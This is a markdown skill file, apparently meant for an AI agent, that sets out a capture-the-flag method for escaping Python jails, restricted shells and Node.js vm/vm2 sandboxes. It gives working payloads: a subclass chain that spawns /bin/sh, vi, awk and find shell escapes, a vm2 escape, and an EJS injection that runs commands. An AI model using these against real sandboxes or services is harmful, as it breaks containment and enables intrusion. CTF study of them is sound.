# SKILL: CTF Jail/Sandbox Escape (PyJail/Node)

## Description
Methodology for escaping restricted shells, Python sandboxes (PyJail), Node.js VMs, and Linux restricted environments.

## Trigger Phrases
jail, escape, pyjail, sandbox, restricted shell, rbash, vm2, escape

## Methodology

### Python Jail (PyJail)
1. **Identify the restriction:** Are you in `input()`, `eval()`, `exec()`, or a custom interpreter? What builtins are disabled? What characters are filtered?
2. **Accessing Object internals:** The goal is to reach `os` or `sys` or `__import__`.
   - `"".__class__.__mro__[1]` to get `<class 'object'>`.
   - `"".__class__.__mro__[1].__subclasses__()` to list all subclasses of `object`.
3. **Finding useful classes:**
   - Look for `os._wrap_close` or `subprocess.Popen` or `warning.catch_warnings` in the subclasses list.
   - Example to find the `os` module: `[x for x in "".__class__.__mro__[1].__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('/bin/sh')`.
4. **Bypassing filters:**
   - No quotes? Use `chr(111)+chr(115)` or `request.args` if in a web context.
   - No `_` (underscore)? Use `getattr(obj, '\\x5f\\x5fclass\\x5f\\x5f')`.
   - No `.` (dot)? Use `getattr()`.

### Restricted Shells (rbash, rzsh, chroot)
1. **Enumeration:** `echo $PATH`, `echo $SHELL`, `export -p`, `env`. Try running `/bin/sh` or `/bin/bash`.
2. **Escape via binaries (GTFOBins):**
   - Check available commands. Can you run `vi`, `awk`, `find`, `man`, `less`, `nmap`, `tar`?
   - `vi` -> `:set shell=/bin/sh` -> `:shell`
   - `awk` -> `awk 'BEGIN {system("/bin/sh")}'`
   - `find` -> `find . -exec /bin/sh \; -quit`
3. **Escape via SSH:**
   - `ssh user@host -t "/bin/sh"`
4. **Path manipulation:**
   - If `/` is allowed but `sh` is not in path: `/bin/sh`.
   - If `/` is restricted: `export PATH=/bin:$PATH`.

### Node.js / VM Escapes
1. **VM / VM2 modules:**
   - Goal: Access the main context's `process` object.
   - Look for prototype pollution or Error stack trace tricks.
   - Basic escape (old VM2): `const p = TypeError.prototype; p.name = { toString: new Proxy(() => "", { apply(t, thisArg, args) { return thisArg.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString() } }) };`
2. **EJS / Template injection:**
   - `<%- global.process.mainModule.require('child_process').execSync('id') %>`

## Tools
- Python subclass search scripts.
- GTFOBins (https://gtfobins.github.io/)
